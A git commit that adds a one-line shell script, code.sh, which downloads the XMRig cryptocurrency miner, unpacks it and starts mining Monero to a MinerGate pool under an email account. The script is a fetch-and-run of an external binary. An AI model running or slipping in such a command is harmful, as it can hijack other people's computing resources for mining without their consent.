6a77418bdc7517a690ef4fcc135dbb920b30c920
supermultiwin2 <75837765+supermultiwin2@users.noreply.github.com>
2020-12-11 11:56:07 +0100

    Create code.sh

---
+++ code.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz && tar xvzf  xmrig-6.5.3-linux-x64.tar.gz &&  ./xmrig-6.5.3/xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u usvk1997@gmail.com
